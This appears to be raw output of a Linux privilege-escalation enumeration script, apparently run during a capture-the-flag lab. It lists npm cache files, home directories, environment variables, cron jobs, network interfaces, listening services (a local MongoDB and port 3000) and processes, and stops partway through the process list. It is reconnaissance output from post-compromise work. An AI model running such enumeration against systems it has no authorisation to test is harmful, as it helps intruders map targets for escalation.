-r--r--r-- 1 root root 428 Sep  2  2017 /home/tom/.npm/_cacache/content-v2/sha512/36/f7/08dc2248cbf4db563f4f9dbbf5b3eaf42610b04e572bf66e956b94f4345a963f52c4431520cc3a32c015c123ab61d813b65611326aee91a44b019cc56c11
-r--r--r-- 1 root root 7130 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/aa/13/3fcb9ede9c658701edeffcd73030be9adffbdf1122defec18cd9d208fa010ed01a4a454916668c3fb7296836a27237a9174a5dd1cb233c2e5e43fec24ff2
-r--r--r-- 1 root root 23166 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/a3/3a/4ce938d1ec90205bb3f1fa3905c40b8ce3fedd5c2498411b3f383b3edaa353c40f3c9de06562ed72d71b342535124ddbef287143adaa4718faa00e45bd58
-r--r--r-- 1 root root 1126 Sep  1  2017 /home/tom/.npm/_cacache/content-v2/sha512/8c/0f/570f5f2d3d82bf9a1422bc8ec462d09a0d245113f5caf61a3ae5a5743b4cc7b776892f44c82b961022a6157e8baf40f51f7dc43ac98204d9d5e1b093ff2b
-r--r--r-- 1 root root 3799 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/2a/1a/354f11ac744df73dde811552e71c4354ca3f79479a58d126125c9850a8b5ad5cadfb40104db6acac324d7689e4111255ad3178e8445155bf6c5db8f82cfa
-r--r--r-- 1 root root 4085 Sep  2  2017 /home/tom/.npm/_cacache/content-v2/sha512/3d/49/57e63990b22550bbffd3c92a9031ab7abdfab265cd49eea85250afda47641f4a67d59a6d44513887ac8c3e0d1c6e1310b988b6396b830679340a2a7197d2
-r--r--r-- 1 root root 7884 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/22/7f/9dcea8e2d1c78fa6c2722749e54757a3b5d963640317da85116ff735ae2982f49866ccce61a28bdfb4d1ffd961aa0ab77c9fdea42d9669e8396b2274fd76
-r--r--r-- 1 root root 32426 Sep  1  2017 /home/tom/.npm/_cacache/content-v2/sha512/cc/07/4dbb0b895705f38ca11ecc4f870f17af02c457df3cd352bd0723e164227c52ea5425ac64f7bd537238f7570bc87f9c8e69121d12ed8740639fb2823ea2d9
-r--r--r-- 1 root root 406 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/cc/83/af8daa4c6650b3b52ed3f08f85ca3e64cf45beadb34a5b793a2308609e7226c929c4622db798b032a54f4b338abad7bac12ec5df119fc9e57df925b9ef45
-r--r--r-- 1 tom tom 1494 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/02/46/d29c389d8f47a882fa02d75cda7eb8967a686e74189c632df042852753268a4c6051d47871d34fc26aaf0b73b474475adf7524280dd85bbb7b36463d80a5
-r--r--r-- 1 root root 1138 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/72/48/8f1308f8f162621df5c996548d272093222792670af6457a0f134c70c0057d4b3ec63520fa61ba0ac35408242c3afb42da3d1207c1b48573e5ca5e613b3b
-r--r--r-- 1 root root 13129 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/6c/16/394808e5b145030c241b405da929f15978a65d3f63a0bf9b022f4c545e7d9b25bb5bf942f0f593a9b814ccf9911c8f6dd85c9659dfa3c51ec1da12181072
-r--r--r-- 1 root root 31231 Sep  2  2017 /home/tom/.npm/_cacache/content-v2/sha512/9c/57/dc5944c52ad855e55fe70dcdfeca93336df957226646e24d3a1e90de734b01d63cc38ac2eb476c2022d15916710d614e4a19c5fcc80887b20e5357559191
-r--r--r-- 1 root root 5128 Sep  1  2017 /home/tom/.npm/_cacache/content-v2/sha512/79/cb/6a523c7f19f97498f161f0c5e0400d5a6487b099c80e3b9506ef05cbda0dc1e520656ca772ba2bd0d2f7bb6dcf14e5e9c5accff3cac9595f9acb0ab4bdf9
-r--r--r-- 1 root root 200887 Sep  2  2017 /home/tom/.npm/_cacache/content-v2/sha512/38/45/c623d1b77bb76cb7fc034773226908359d728b8e93bdebec3b96b14b715d3149046cee35c99468ee42654f14e6867fa8255dfd9e964795614f42dd495c5a
-r--r--r-- 1 tom tom 369 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/09/58/7c1563469577cacee9e36839b1a12769a759445f242bc95727756afc8500822b2d5d1a697e616d38d32384088da234997543cfb64ace0dd0628071fe1912
-r--r--r-- 1 root root 4026 Sep  1  2017 /home/tom/.npm/_cacache/content-v2/sha512/28/f1/e6e152f97435cacf4d54b8477cf037fe2b3ca76a88522fd7c1874f7a29603148a6500c8dae06b56ab6f44ce2bc2b22b4512ac74b34c2ff96769a552462a0
-r--r--r-- 1 root root 4870 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/1c/c3/9a6850f5306ba27d41b5bba16001bb7a62ca26a17c5ed476e8449276bb00c878d28aba4f34e02120c5e00d9686e7bae00374a394352ee2fbe41b2320e3e0
-r--r--r-- 1 root root 20562 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/83/7d/fd66cdcd93b9a1eb6c47722f5a823d3904dc5cd35e3d5a702dff97f5186c62056434300783c3f81fce83710a5179d1991993ef76ae20fd3dfeb74baf169c
-r--r--r-- 1 root root 628 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/83/d9/a61c5dc6ce6c13cf87f23dbe2d3a7e64b07f7e781cad46dbbefb64d91b8d8feda10d11b575b08e14d389763bdd4846ccd236108ba9a79c64bc990ef2d9a4
-r--r--r-- 1 root root 4142 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/e0/01/fa6797f334d05c1fee970cc7c0fc14edf3bb24c6a2653b49408770e47abe734e1700c46ea62b3fa21aedf4f142a83cf43c0dcab1ff8261ba3ce5b516be85
-r--r--r-- 1 root root 200887 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/e0/0e/dc261da6c8356a8b4e56c96f2fe1ef0332683151165af27949e2dda24028ef02a5762095126726b4c75f4817ecc50aa6b6768c15f35d6471851c8f50fdfb
-r--r--r-- 1 tom tom 18942 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/b0/46/11185dc2a22775f3d35027e5cae8aed1aab948b720f2ee7585a1be569547cd741470f1a274ff9dcb13a8b375ad15e062c8f317bf01fbd05dd984c7c593f7
-r--r--r-- 1 root root 3566 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/ce/74/d8446e3b913c406f0805c6a0fe8458f71e65349728346262cca22d48e44906aa56aaf62b14ea91cc9216c49dfd6f6f9d27af41a81fb83b3e1a947e369272
-r--r--r-- 1 tom tom 995 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/cf/c7/62c59b698c118706397ea0528f6da2516278f93ed51e6ae24f45a920be3430942d7bab11eaa0b30e503f6af6af7f9778ec8df0e4256ad4afd5ff21213bd3
-r--r--r-- 1 root root 938 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/0a/31/0018dd7dbf3ad7f38dc3242184487c565fb224282b10da9fb70f931370336e4c0df30a4cf2dcea4f44bd57196fbf9148a74172bf269e67a6d4fc669fa864
-r--r--r-- 1 tom tom 809 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/ff/50/b2885324feec9573ed086e0ec31e9208d5de6122693228dde8e2dc68ed5dc68eecadd5cfd953e8b24be459bb56ade7daf55cf32119d4dda7cb2b24f83f6b
-r--r--r-- 1 root root 8362 Sep  2  2017 /home/tom/.npm/_cacache/content-v2/sha512/25/25/0dec97ee21b37ce0215d3ae34b8187f2e43236569e71bf9cc044073b86dbbb1f28d162590f4f13e5d34f6d0e1b30f95b73c2a3a03788bc328737af16a526
-r--r--r-- 1 root root 456 Sep  1  2017 /home/tom/.npm/_cacache/content-v2/sha512/f4/57/7a8b8bd068ea49ec32d1d995cdd9b459f58730ca12b963ac03c7d87c2e25cec75abc6df8f816cea46881ea2d1e20cde2f7abadd3bb7324bc5bd4209a638d
-r--r--r-- 1 root root 21701 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/7e/35/458d6f7286a321546c111310972e124aacb9646126b135677273dae61e5ad565b937e581c7df5d9d15def5f75b90797908de628b65321b4af21e17015e9a
-r--r--r-- 1 root root 20562 Sep  2  2017 /home/tom/.npm/_cacache/content-v2/sha512/61/a9/1a7396b5530c32e9a9e062e72accb091c9862fe14831efa40342177365fc7da3195a455543cadf3eb4dee7e088a24a76958ebc6f5fa2db3bbfd9bc136eb3
-r--r--r-- 1 tom tom 166124 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/37/27/f95e6baa2eeeef25538c179901021e5e183daddd4ed73ce6d1a0a0aa24a6ad1e9e4110a85c26cc4182501352c1f092667da76775bd7a541b527ca3abeaaf
-r--r--r-- 1 root root 1352 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/50/18/81cc11183c7c923e65586feca00ae1ab3e664709dd0a38dd1f66b5969977dc4afc24dddfdd39483313338d432d9a608eb8990d63c528a6f850a905681ff5
-r--r--r-- 1 root root 6732 Sep  1  2017 /home/tom/.npm/_cacache/content-v2/sha512/39/42/a1f587b4d07037049e3d5e662f15d1b68db98314e2d97ee672d75cb48300b2332de2840987029052bcded9b43d6b703480a226c2efbb255520e8d0dc9e48
-r--r--r-- 1 root root 5200 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/71/9d/92d8991ca75ed8ce81300d6d7e7963cfca9b7c01e86ac0c06ab76113ce25515a95c9dbc2115210cf70dd2cb2e3b6a9a3df5e920e832d460abe6a87a482f2
-r--r--r-- 1 root root 8564 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/7a/a7/d71c260529853563795b8e2bacc232627dca34a7310261e9ae537939bec80350788d1ced08827d057995c56336593c05431108b0e33166360a9e70f414b7
-r--r--r-- 1 root root 2533 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/0c/fa/c4da24562f44c3e4e145e1f6c6273b4f81610021c22311cb8b19e1c7d8b4fc97c7463d550d01b907e6e4ad8412f02c1e75962c1ebd453e0f91cdfecd3e22
-r--r--r-- 1 root root 1863 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/95/b7/68413f534d74ff31dba29496c5b91fccf674bd5afafdbfef059c94289dc1a680eb63d60ca1330115ba8f4d449471f17bc94580e3d282b8655c9694a6859d
-r--r--r-- 1 root root 3213 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/5c/26/724621c5b10fa24d106e1ee449d08542547e9ef351e5c1bf5935d1a3fc7694c9377028f3c58653fe501d1cd4901ec1cb20fe38982d684d8547ecdca7199a
-r--r--r-- 1 root root 15723 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/59/f1/bf5fdfa801387cd57b65948a3f23c80e898f445d176fd5c41dcb291e5cad7b61c516dc45d4022d93a38a5c1fa9d9b493ebed93a933938cc962599bef11b2
-r--r--r-- 1 root root 6549 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/d7/a9/7fafc460ce55ca9853a16691c1cedbf27be940842e5253b8576af9deac2f547d9a99c715e5dc1ccbf0c85f7cf4f7905eb5963f4e6afd8b284ce1d1e8bbb6
-r--r--r-- 1 root root 17169 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/86/db/6a201ed5051f55a112459bb0daedcff444f824c56249f2b9968e3157a49b546a791022fc35ccc791f82a06b6c31a24ec51e616d5aeb425d8e58d7e97f216
-r--r--r-- 1 root root 1272 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/b9/fa/0bbba7100103343e511551d43aa582734c25f8ad42c6bd2f68323721d7f5089583f48bc50ce3de4c7c0686bceb802ffd26948181022e63f0d90798af7ec4
-r--r--r-- 1 tom tom 2762 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/e4/93/3a34010f6a0b37b9df2810a41072655bb5a89f59d9087b0bd29d4c674eb53f87a411e648d9e93554fd9467618a14fc408b2c95746a0a673efeaff4d91c6e
-r--r--r-- 1 root root 31231 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/60/b5/25f172ef5be4f2bfa6f90d22cfc185104361c63cfe7b3ac426dd171b13f8a276a3cc5f30f90a14e3cca9d26cc0431a14ae16bc8aec8a88ef98b4313e2946
-r--r--r-- 1 root root 2127 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/30/4b/a3166b0012230c9fb61091a35ed75fe834522fc26df63957a387c0b30a3125f66d097ad171e71a46578abe9025a11e0baf48956eec945bd35c17f99df29b
-r--r--r-- 1 tom tom 1283 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/6f/72/f85900224b83c92cf2a3408f4d65501b5f815312cbc965158c4af6a39ed78a56f7fcff1dfc454edd95c349c3f360a9cbe33ab7657fc63ff3311c3afb7a7b
-r--r--r-- 1 root root 15579 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/e9/d8/b7b20399121172b2c79fdeb23750c721557794ce20e3918f004ffacd11cd7d0c60070458eb39acbfe4ccb3f61e762e88a2e269f125ce40b0aba8a1b7a5ad
-r--r--r-- 1 root root 1 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/0b/61/241d7c17bcbb1baee7094d14b7c451efecc7ffcbd92598a0f13d313cc9ebc2a07e61f007baf58fbf94ff9a8695bdd5cae7ce03bbf1e94e93613a00f25f21
-r--r--r-- 1 root root 8362 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/a4/c2/d312060b3ed16843feed71a80e254ad0da767c455858f634bbd27ab9e19b8d37862516a94723868a389a7bc09ca94bf8270fdc2da8f55ce52029010cdef0
-r--r--r-- 1 root root 3527 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/5b/b0/d7d8aef04e45f13ce189c9632a29b8242c121482bce51dabfa0aba1fd74241fe979de3920cc661957679141953f4083306924287499908837f80c027919d
-r--r--r-- 1 tom tom 1804 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/5b/9d/ddb8e387ee89b24f497b6a7af1a290856a01a7a5604695b87f3391b0c5db52b1c34aac3deb8c786fb9df5d17cefff8e08dfd38afc86896741a5de286ff06
-r--r--r-- 1 root root 3050 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/e2/ad/2dd2d7faf38f90e0f02fad82308c67d42ab7d3897e52034fc39774cd6f633a964ba8b7d0407a476c1e37bf45cd1b45a1f823a28cf86509bb163a76b8b16d
-r--r--r-- 1 root root 3270 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/45/34/d059633da20081d3197533413f9175a6fdf96addcfe23289714c99e858963329a6c6fc4c30ef8d0097a9b85a23a58a7c30ff52ead9ce9c8f98ab8ec5af45
-r--r--r-- 1 root root 11614 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/45/3b/28d6abe8de0954f55765fc2d51067c6d18f122fd5521ad01bdf1f828ed613df1226c180b17c362a4faf140b53f061523bcc43008a18428e1487206d09047
-r--r--r-- 1 root root 11741 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/bf/0a/3a980764f2381c58c65e8d1173b993a28d9f2dc73889e486d21cffc676c201cfb4af9a900b2f2c7729c388aad102d73c9ec7d88aa71ae2b9dcc11aa567ce
-r--r--r-- 1 tom tom 824 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/bf/89/e7f12d84fff9b6f74a6f84979ac4e30f402ed495e4ead72c9df8e959a0ac20bd72748f38bb5c9e48c992f272f8d6da718d3d37c453ef5e85441c3b458be6
-r--r--r-- 1 tom tom 72948 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/40/83/bebd63c18aac3b00abaf98d219e19e3166df0ca86175bb15a50bf9aeb5b20bd894f26f486323e07f02a89751cec1e2de2c74c2dd820c8b503925338af09b
-r--r--r-- 1 root root 6169 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/c8/a7/f1efdc31d89938a3a09926b021153d4536f7e3fa18879b45d350289845072f1c05293b283b7d627026dbb88024a7f3781294e3149a933f9d23ec69ca1d2e
-r--r--r-- 1 root root 428 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/5d/3d/531f5c3d4a9cfdf0e71fdeadc0766ef49291b706e9af77e8b164bab7991faf66400eac83191b933fd40722c9374de3689a4e25aa840a7463ad48ad0a7dd2
-r--r--r-- 1 root root 2119 Sep  2  2017 /home/tom/.npm/_cacache/content-v2/sha512/d9/16/76945565287e740d5cffcd51d8ff502caec347d11cbd6392fb44994648d94e6d35f660cfb5be733786cd8dd96f00cd3c556d767ac4877a168168e8a61e73
-r--r--r-- 1 tom tom 30144 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/8d/50/33674e9456e96ce7ed0a04bb60e5a1017f76dd2a4bb0c32503622441167d72ed59011393563b98c12326f8f00e5078e28feb62ae647c5e101707f400b317
-r--r--r-- 1 root root 1043 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/04/75/246bb8ebcab707d97f9d2fcaacf2c05a81d9e45d28893e1c6a91297983fbb51e783ec27aa1993898d4cd9660f581de1572b3c434d9780c565f9f9df2664c
-r--r--r-- 1 root root 21201 Sep  1  2017 /home/tom/.npm/_cacache/content-v2/sha512/04/15/72e84fd7aa3079d3bc2a7b94feec86b637f82dbabfdd4ff7ca9af186290a94af323875c04f189815e2dd9c897ec5a3164f85970a4c34e66f8fb99c2c903b
-r--r--r-- 1 root root 26270 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/bd/8c/ace284a219a9c7a9844888ac459925baf71e8da8b436046ab4ac81b2c48b1cdf52a90f13b943f8dd4a54cf3e13a5496eb4bb99265bbe56a766471e3e6517
-r--r--r-- 1 root root 4168 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/e7/0a/98a4b2a9358c726c6b09e109ada1ca918de639c8a6af5e142a4180a09233f424268b743b1c29309ecd1e8e72f92d17a73eec5d332fa711a7993be30c2ef0
-r--r--r-- 1 tom tom 2430 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/15/11/e128392abdb3b856c047c8f49a8d5e2fbba2482aff025aa9ff645c67f1bf40b21c470e61b87605b95334c16f035417171d00e6d2f948793734ba60e820ae
-r--r--r-- 1 tom tom 20238 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/a2/b2/5143d69532100ba5c1ba890cb40d3002af332412fb6e165e11cd7ade42ee627c99d4290046624c8d929ced2c927af7c13a1eb7dfc686e9d14364dade9c40
-r--r--r-- 1 root root 12440 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/a2/e3/8a7261f7a182341e82fd3a2daf7de370dd765027b5e82bf568f58bc9ca687b19b39ee57068475d0ffd1f9b8807985f7b8d53df7825f3f25c0cd953738ea3
-r--r--r-- 1 root root 2195 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/89/a5/f8988e340725f9a028a24384046db95406868e1fb1bb0e07cb35ea5f8c676ddb56ef0e47b51ca1a4c01cefda5a984963c1027c2245d68a6fe24ef8aaf53d
-r--r--r-- 1 tom tom 3907 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/62/82/c6179955c41ec7ec122a3881b0a277b4326ddffb3156149b49a20ef75660d4d4a201b33916d25036775f04657dc16e1a08792f5c7af6c86897ba2c3054fb
-r--r--r-- 1 root root 11325 Sep  2  2017 /home/tom/.npm/_cacache/content-v2/sha512/6a/06/2c143cdec1e5566135ce01c50843f68e91a257a6dfc6947b78066a08a09132ffe25d1066ee15da8259fbcf5e5eb7b987826881fa932cb8d22e08e38a6080
-r--r--r-- 1 root root 4168 Sep  2  2017 /home/tom/.npm/_cacache/content-v2/sha512/f9/02/88f25ebacac15cf36769d34770bcef60c2937c75f512c01137bcfcd674217c7b0a29095794763b940bbbc3e658d3090323a6454d162621cd2419ff5645f5
-r--r--r-- 1 root root 2471 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/43/77/dfd5d1a6246db62d05267525c7a35263b688f3dc5a554e8409a1ba7b7e6767f078eea3d3199202159c55c3f4f68c738b90e122e94f1db05008d56a705af2
-r--r--r-- 1 root root 8490 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/46/69/329d12e72b100597d94255eebb3a16168116eb23f9dc76372e29af7faa4087dc5f80f1768dea5ed83e2e622a333fdcf934df696738cb913379202d5ad345
-r--r--r-- 1 root root 22981 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/fd/3e/20d284b41ba40f5313e46f3f562a00ae445b86c1c5708635471e7dc506b188fc70b219f7b5cb377e64aae7e78bdde71e145e2c491fea2abe6fb10ed28159
-r--r--r-- 1 tom tom 28640 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/fd/c4/37401da11208b21c19f69670201421c6372012852c6a4155aa7d1e95509663fd072a35ed44a87ef5f465c61d811fe2dcda90306e20f78ea31791eef30cf9
-r--r--r-- 1 root root 2119 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/56/ea/da2dafb00639cbbca3add6006d0a4fa96b36d86e9de433be59481f2bb211f45039bb3756d36e2d68c1d14312babfa2e143d60de8418893b41c1c310c3a78
-r--r--r-- 1 root root 3050 Sep  2  2017 /home/tom/.npm/_cacache/content-v2/sha512/00/06/2ab0958ea2c73b29745b11d825e60fbce18cccd7ddfcd6e3fed8c9d46e3f1a31657a96c3ed351bf349f59097b14dcf8b98b37cf9fad705dfb4fda31a6fc3
-r--r--r-- 1 root root 5569 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/00/c7/b9075670410f50ece88cefd4de15bc8417a78fd5dc092ebbaf0d72a7cabd3e7d7399012ce28fa013d06c0f7bc968fe7cf41c967225c0191d7fb289956205
-r--r--r-- 1 root root 12970 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/8e/08/c97daa2fa77c27912613b16517c92254e0d9479dae38635ea794d26ff6a6a8d949f95e3a06c3e1d3fea7a4ae15222470a3ce6540f70a017fbaf9c84d835c
-r--r--r-- 1 root root 23166 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/c4/91/49d81bb7baaa1ee888e9cb4099dde8bfd9b1402548ba97cd408cf17294e37118a05b37344be4704042937b844cb00a0c6526ec991a76607d22bde7636df7
-rwxr-xr-x 1 root root 0 Aug 30  2017 /home/tom/.mongorc.js
-rw-r--r-- 1 root root 3771 Aug 29  2017 /home/tom/.bashrc


[-] Home directory contents:
total 24K
drwxr-xr-x 3 root root 4.0K Sep  3  2017 .
drwxr-xr-x 5 root root 4.0K Aug 31  2017 ..
-rw-r--r-- 1 root root  220 Aug 31  2017 .bash_logout
-rw-r--r-- 1 root root 3.7K Aug 31  2017 .bashrc
drwx------ 2 root root 4.0K Aug 31  2017 .cache
-rw-r----- 1 root root    0 Sep  3  2017 .dbshell
-rwxr-xr-x 1 root root    0 Sep  3  2017 .mongorc.js
-rw-r--r-- 1 root root  655 Aug 31  2017 .profile


### ENVIRONMENTAL #######################################
[-] Environment information:
XDG_SESSION_ID=18
TERM=xterm-256color
SHELL=/bin/bash
SSH_CLIENT=10.10.14.16 52860 22
SSH_TTY=/dev/pts/0
USER=mark
MAIL=/var/mail/mark
PATH=/home/mark/bin:/home/mark/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
PWD=/home/frank
LANG=en_GB.UTF-8
SHLVL=3
HOME=/home/mark
LANGUAGE=en_GB:en
LOGNAME=mark
SSH_CONNECTION=10.10.14.16 52860 10.10.10.58 22
LC_CTYPE=en_US.UTF-8
LESSOPEN=| /usr/bin/lesspipe %s
XDG_RUNTIME_DIR=/run/user/1001
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env


[-] Path information:
/home/mark/bin:/home/mark/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
/usr/bin/screen


[-] Current umask value:
0002
u=rwx,g=rwx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Aug 29  2017 .
drwxr-xr-x 92 root root 4096 Jan 18 14:40 ..
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  189 Aug 29  2017 popularity-contest

/etc/cron.daily:
total 56
drwxr-xr-x  2 root root 4096 Aug 29  2017 .
drwxr-xr-x 92 root root 4096 Jan 18 14:40 ..
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Jun 19  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Aug 29  2017 .
drwxr-xr-x 92 root root 4096 Jan 18 14:40 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Aug 29  2017 .
drwxr-xr-x 92 root root 4096 Jan 18 14:40 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Aug 29  2017 .
drwxr-xr-x 92 root root 4096 Jan 18 14:40 ..
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


### NETWORKING  ##########################################
[-] Network and IP info:
ens33     Link encap:Ethernet  HWaddr 00:50:56:8f:a4:ea
          inet addr:10.10.10.58  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:fe8f:a4ea/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:427176 errors:0 dropped:22 overruns:0 frame:0
          TX packets:234945 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:29844281 (29.8 MB)  TX bytes:243994677 (243.9 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:432199 errors:0 dropped:0 overruns:0 frame:0
          TX packets:432199 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:35428826 (35.4 MB)  TX bytes:35428826 (35.4 MB)


[-] ARP history:
? (10.10.10.2) at 00:50:56:8f:64:fe [ether] on ens33


[-] Default route:
default         10.10.10.2      0.0.0.0         UG    0      0        0 ens33


[-] Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:54274         127.0.0.1:27017         ESTABLISHED -
tcp        0      0 127.0.0.1:27017         127.0.0.1:54272         ESTABLISHED -
tcp        0      0 127.0.0.1:27017         127.0.0.1:54276         ESTABLISHED -
tcp        0      0 127.0.0.1:54272         127.0.0.1:27017         ESTABLISHED -
tcp        0      0 127.0.0.1:27017         127.0.0.1:54274         ESTABLISHED -
tcp        0      0 127.0.0.1:54276         127.0.0.1:27017         ESTABLISHED -
tcp        0   6380 10.10.10.58:22          10.10.14.16:52860       ESTABLISHED -
tcp6       0      0 :::3000                 :::*                    LISTEN      -


[-] Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.7  38084  6008 ?        Ss   03:27   0:05 /sbin/init
root         2  0.0  0.0      0     0 ?        S    03:27   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    03:27   0:01 [ksoftirqd/0]
